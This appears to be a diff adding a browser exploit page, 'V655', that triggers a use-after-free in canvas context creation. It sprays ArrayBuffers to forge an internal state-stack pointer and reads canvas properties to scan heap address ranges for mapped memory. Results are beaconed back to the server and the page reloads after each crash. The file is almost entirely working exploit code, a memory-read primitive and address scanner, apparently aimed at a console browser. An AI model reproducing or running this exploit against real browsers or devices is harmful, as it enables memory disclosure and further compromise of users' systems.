@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V655</title></head>
+<body><pre id="out">V655 — binary subdivision heap scanner</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+var _imgs=[];for(var i=0;i<60;i++)_imgs.push(new Image());
+var _ix=0;
+function bk(tag,d){
+  var img=_imgs[_ix++%60];
+  img.src='/beacon/V655-'+tag+'?d='+encodeURIComponent(String(d).slice(0,900))+'&t='+Date.now();
+}
+var _b8=new ArrayBuffer(8),_f64=new Float64Array(_b8),_u32=new Uint32Array(_b8);
+var _bu;try{_bu=new BigUint64Array(_b8);}catch(e){}
+function f2big(v){if(_bu){_f64[0]=v;return '0x'+_bu[0].toString(16);}
+  _f64[0]=v;return '0x'+('00000000'+_u32[1].toString(16)).slice(-8)+('00000000'+_u32[0].toString(16)).slice(-8);}
+
+/*
+ * BINARY SUBDIVISION ALGORITHM
+ * ============================
+ * Search space: 0x310000000 - 0x311800000 (24MB)
+ *
+ * Generate ALL probe offsets upfront, ordered by level:
+ *   Level 0: start(0), mid(12M), end(24M)          — 3 probes
+ *   Level 1: 6M, 18M                                — 2 probes
+ *   Level 2: 3M, 9M, 15M, 21M                       — 4 probes
+ *   Level 3: 1.5M, 4.5M, 7.5M, 10.5M, 13.5M...    — 8 probes
+ *   Level 4: 750K intervals                          — 16 probes
+ *   Level 5: 375K intervals                          — 32 probes
+ *   Level 6: ~187K intervals                         — 64 probes
+ *
+ * Total: 3+2+4+8+16+32+64 = 129 probes → 24MB at ~187KB resolution
+ *
+ * After primary range: secondary ranges (SceLibcHeap2, wide sweep)
+ *
+ * On HIT: read 4 offsets (lineWidth/miterLimit/globalAlpha/shadowBlur)
+ *         THEN re-forge +0x1000 and read again (8 total data points per HIT)
+ * On CRASH: page reloads, counter advances, next probe fires
+ */
+
+var BASE_HI = 0x00000003;
+var BASE_LO = 0x10000000;
+var RANGE = 0x1800000; // 24MB
+
+/* Build probe schedule */
+var PROBES = [];
+
+/* Level 0: endpoints + midpoint */
+PROBES.push({off:0, lvl:0});
+PROBES.push({off:RANGE>>>1, lvl:0});
+PROBES.push({off:RANGE, lvl:0});
+
+/* Levels 1-6: fill in gaps */
+for (var L = 1; L <= 6; L++) {
+  var divisor = 1 << (L + 1);
+  var step = (RANGE / divisor) >>> 0;
+  for (var k = 0; k < (1 << L); k++) {
+    PROBES.push({off: ((2*k+1)*step)>>>0, lvl:L});
+  }
+}
+
+/* Secondary range: 0x2000D0000-0x200200000 at 256K steps */
+var SEC_HI = 0x00000002;
+var SEC_BASE = 0x000D0000;
+var SEC_RANGE = 0x130000; // ~1.2MB
+for (var s = 0; s <= SEC_RANGE; s += 0x40000) {
+  PROBES.push({off:s, lvl:7, secHi:SEC_HI, secLo:SEC_BASE});
+}
+
+/* Wide sweep: 0x308000000-0x310000000 at 8MB steps */
+var WIDE_HI = 0x00000003;
+for (var w = 0x08000000; w < 0x10000000; w += 0x800000) {
+  PROBES.push({off:w, lvl:8, secHi:WIDE_HI, secLo:0});
+}
+
+/* Wide high: 0x312000000-0x320000000 at 8MB steps */
+for (var wh = 0x12000000; wh <= 0x20000000; wh += 0x800000) {
+  PROBES.push({off:wh, lvl:9, secHi:0x00000003, secLo:0});
+}
+
+var MAX = PROBES.length;
+
+/* State from localStorage */
+var idx = 0;
+try { idx = parseInt(localStorage.getItem('v655_idx')) || 0; } catch(e) {}
+var results = [];
+try { results = JSON.parse(localStorage.getItem('v655_res') || '[]'); } catch(e) { results = []; }
+
+/* Clean old probe state */
+try{localStorage.removeItem('v654_attempt');localStorage.removeItem('v654_hits');}catch(e){}
+
+bk('BOOT', 'i='+idx+'/'+MAX+'|hits='+results.filter(function(r){return r.s==='H';}).length+'|miss='+results.filter(function(r){return r.s==='M';}).length);
+say('Probe '+idx+'/'+MAX+' | Level '+((idx<MAX)?PROBES[idx].lvl:'done'));
+say('Hits: '+results.filter(function(r){return r.s==='H';}).length+' / Misses: '+results.filter(function(r){return r.s==='M';}).length);
+
+if (idx >= MAX) {
+  /* Dump all results as beacon */
+  var summary = results.map(function(r){return r.a+':'+r.s;}).join(',');
+  bk('DONE', 'total='+results.length+'|'+summary.slice(0,800));
+  say('\n=== SCAN COMPLETE ===');
+  results.forEach(function(r){
+    say((r.s==='H'?'HIT ':'MISS')+' '+r.a+(r.d?' -> '+r.d:''));
+  });
+} else {
+  var p = PROBES[idx];
+  var probeHi, probeLo;
+
+  if (p.secHi !== undefined) {
+    probeHi = p.secHi;
+    probeLo = (p.secLo || 0) + p.off;
+  } else {
+    probeHi = BASE_HI;
+    probeLo = BASE_LO + p.off;
+  }
+
+  /* Handle carry from lo to hi */
+  if (probeLo >= 0x100000000) {
+    probeHi += (probeLo >>> 0) !== probeLo ? 1 : 0;
+    probeLo = probeLo >>> 0;
+  }
+
+  var addrHex = '0x'+('00000000'+probeHi.toString(16)).slice(-8)+('00000000'+(probeLo>>>0).toString(16)).slice(-8);
+  bk('TGT', 'i='+idx+'|L'+p.lvl+'|'+addrHex);
+  say('-> '+addrHex+' (level '+p.lvl+')');
+
+  /* Pre-save as MISS — if we crash, this stands. If we survive, we overwrite with HIT */
+  results.push({a:addrHex, s:'M', l:p.lvl});
+  try {
+    localStorage.setItem('v655_idx', String(idx + 1));
+    localStorage.setItem('v655_res', JSON.stringify(results));
+  } catch(e) {}
+
+  /* === UAF TRIGGER === */
+  var canvas = document.createElement('canvas');
+  canvas.width = 1; canvas.height = 1;
+  var innerCtx = null;
+  var uafOpts = {};
+  Object.defineProperty(uafOpts, 'alpha', {get: function() {
+    innerCtx = canvas.getContext('2d');
+    return true;
+  }});
+  canvas.getContext('bitmaprenderer', uafOpts);
+
+  if (!innerCtx) {
+    bk('FAIL', 'no-inner');
+    setTimeout(function(){location.reload();},2000);
+  } else {
+    for (var f = 0; f < 600; f++) new ArrayBuffer(16);
+
+    var abs = new Array(200);
+    var dvs = new Array(200);
+    for (var ss = 0; ss < 200; ss++) {
+      abs[ss] = new ArrayBuffer(768);
+      dvs[ss] = new DataView(abs[ss]);
+    }
+
+    /* Forge m_stateStack → target */
+    for (var w = 0; w < 200; w++) {
+      dvs[w].setUint32(112, probeLo>>>0, true);
+      dvs[w].setUint32(116, probeHi, true);
+      dvs[w].setUint32(120, 2, true);  // size
+      dvs[w].setUint32(124, 1, true);  // capacity
+    }
+
+    /* CRITICAL READ — crashes here if unmapped */
+    var lw = innerCtx.lineWidth;
+
+    /* ===== HIT! Page is mapped! ===== */
+    var lwB = f2big(lw);
+    bk('HIT', '***'+addrHex+'|L'+p.lvl+'|lw='+lwB+'***');
+    say('*** HIT *** '+addrHex+' lw='+lwB);
+
+    /* Multi-offset read */
+    var ml=-1,ga=-1,sb=-1;
+    try{ml=innerCtx.miterLimit;}catch(e){ml=-888;}
+    try{ga=innerCtx.globalAlpha;}catch(e){ga=-888;}
+    try{sb=innerCtx.shadowBlur;}catch(e){sb=-888;}
+    var mlB=f2big(ml), gaB=f2big(ga), sbB=f2big(sb);
+
+    /* Re-forge +0x1000 for second read pass */
+    var probeLo2 = (probeLo + 0x1000)>>>0;
+    var probeHi2 = probeHi + (probeLo + 0x1000 > 0xFFFFFFFF ? 1 : 0);
+    for (var w2 = 0; w2 < 200; w2++) {
+      dvs[w2].setUint32(112, probeLo2, true);
+      dvs[w2].setUint32(116, probeHi2, true);
+    }
+    var lw2=-1,ml2=-1;
+    try{lw2=innerCtx.lineWidth;}catch(e){lw2=-888;}
+    try{ml2=innerCtx.miterLimit;}catch(e){ml2=-888;}
+    var lw2B=f2big(lw2), ml2B=f2big(ml2);
+
+    var dataStr = 'lw='+lwB+'|ml='+mlB+'|ga='+gaB+'|sb='+sbB+'|lw+4K='+lw2B+'|ml+4K='+ml2B;
+    bk('DATA', addrHex+'|'+dataStr);
+    say('  '+dataStr);
+
+    /* Update result to HIT */
+    results[results.length-1] = {a:addrHex, s:'H', l:p.lvl, d:dataStr};
+    try { localStorage.setItem('v655_res', JSON.stringify(results)); } catch(e) {}
+
+    /* Clean forge */
+    innerCtx = null;
+    for (var c = 0; c < 200; c++) {
+      dvs[c].setFloat64(112, 0, true);
+      dvs[c].setUint32(120, 0, true);
+      dvs[c].setUint32(124, 0, true);
+    }
+    canvas._abs = abs;
+  }
+
+  bk('NEXT', 'reload-2s');
+  setTimeout(function(){location.reload();}, 2000);
+}
+</script>
+</body></html>
